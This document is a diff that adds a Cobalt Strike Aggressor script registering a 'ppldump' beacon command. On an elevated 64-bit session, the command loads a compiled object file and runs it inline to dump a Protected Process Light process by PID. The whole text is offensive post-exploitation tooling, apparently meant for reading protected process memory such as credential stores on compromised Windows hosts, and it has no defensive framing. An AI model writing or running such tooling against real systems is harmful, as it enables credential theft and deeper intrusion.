@@ -1,0 +1,19 @@
+beacon_command_register(
+"ppldump",
+"Dump PPL via PID.",
+"Synopsis: ppldump PID");
+
+alias ppldump {
+    local('$handle $args $data');
+
+    if ((-isadmin $1) && (-is64 $1)) {
+        $handle = openf(script_resource("ppl_dump.x64.o"));
+        $data = readb($handle, -1);
+        closef($handle);
+    
+        $args = bof_pack($1, "i", $2);
+        beacon_inline_execute($1, $data, "go", $args);
+    } else {
+        berror($1, "We require two things: An elevated session and a 64-bit process.");
+    }
+}
